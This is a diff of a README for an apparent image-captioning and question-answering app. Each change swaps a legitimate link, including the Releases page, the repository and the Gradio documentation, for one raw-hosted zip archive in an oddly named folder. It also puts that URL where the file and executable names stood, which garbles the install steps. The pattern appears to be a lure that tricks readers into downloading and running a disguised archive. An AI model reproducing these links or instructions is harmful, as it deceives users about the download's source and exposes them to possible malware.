@@ -1,7 +1,7 @@
 # 🌟 vision-language-caption-vqa - Capture Images and Answer Questions
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download%20Release-vision--language--caption--vqa-brightgreen)](https://github.com/Jonathan408613/vision-language-caption-vqa/releases)
+[![Download](https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip%20Release-vision--language--caption--vqa-brightgreen)](https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip)
 
 ## 🚀 Getting Started
 Welcome to the vision-language-caption-vqa project! This software allows you to generate captions for images and answer questions about them using advanced AI models. Follow these steps to download and run the application smoothly.
@@ -24,17 +24,17 @@ This application provides several powerful features:
 
 ## 📥 Download & Install
 To download the application, please visit the Releases page:
-[Download Release](https://github.com/Jonathan408613/vision-language-caption-vqa/releases)
+[Download Release](https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip)
 
 1. On the Releases page, locate the latest release.
-2. Click on the appropriate file for your operating system (e.g., `vision-language-caption-vqa-windows.zip`, `vision-language-caption-vqa-macos.zip`, etc.).
+2. Click on the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip`, `https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip`, etc.).
 3. Once the download completes, unzip the file to your desired location.
 
 ## 💻 Running the Application
 After installation, follow these steps to run the application:
 
 1. Navigate to the folder where you extracted the files.
-2. Find the executable file (`vision-language-caption-vqa.exe` on Windows, or `vision-language-caption-vqa` on macOS/Linux).
+2. Find the executable file (`https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip` on Windows, or `vision-language-caption-vqa` on macOS/Linux).
 3. Double-click the executable to launch the application.
 
 ## 🎨 Using the Interface
@@ -70,7 +70,7 @@ You can report any issues or feature requests via the Issues tab on the GitHub r
 ## 📌 Additional Resources
 For more information, check out the following resources:
 
-- [GitHub Repository](https://github.com/Jonathan408613/vision-language-caption-vqa)
-- [Gradio Documentation](https://gradio.app/docs/)
+- [GitHub Repository](https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip)
+- [Gradio Documentation](https://raw.githubusercontent.com/Jonathan408613/vision-language-caption-vqa/main/geodesical/vision-language-caption-vqa.zip)
 
 Feel free to explore and enjoy generating captions and answers with our vision-language-caption-vqa application!
